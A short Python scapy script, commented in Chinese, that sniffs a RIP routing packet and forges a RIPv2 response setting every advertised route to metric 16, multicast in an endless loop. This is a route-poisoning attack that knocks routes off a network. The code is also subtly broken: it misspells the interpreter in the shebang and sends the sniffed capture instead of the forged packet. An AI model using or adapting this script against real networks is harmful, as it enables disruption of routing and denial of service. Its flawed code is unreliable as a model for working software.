#!/usr/bin/env pyhton3
# -*- coding:utf-8 -*-

from scapy.all import RIP, Ether, IP, UDP, RIP, RIPEntry, sniff, send

packet = sniff(stop_filter=lambda x: x.haslayer(RIP))
mac_dst = packet[-1][Ether].dst
mac_src = packet[-1][Ether].src
ip = packet[-1][RIPEntry].addr
entry = packet[-1][RIPEntry]
ripentry = RIPEntry(addr=ip, metric=16)

# 判断是否只有有其他的路由信息
if entry.getlayer(RIPEntry, 2):
    while entry:
        # 获取下一个路由信息
        entry = entry.getlayer(RIPEntry, 2)
        ip = entry.addr
        ripentry = ripentry / RIPEntry(addr=ip, metric=16)


rip = (Ether(dst=mac_dst, src=mac_src)
       / IP(dst="224.0.0.9", src=ip)
       / UDP(dport=520, sport=520) / RIP(cmd=2, version=2) / ripentry)

while True:
    packet.show()
    send(packet, verbose=0)
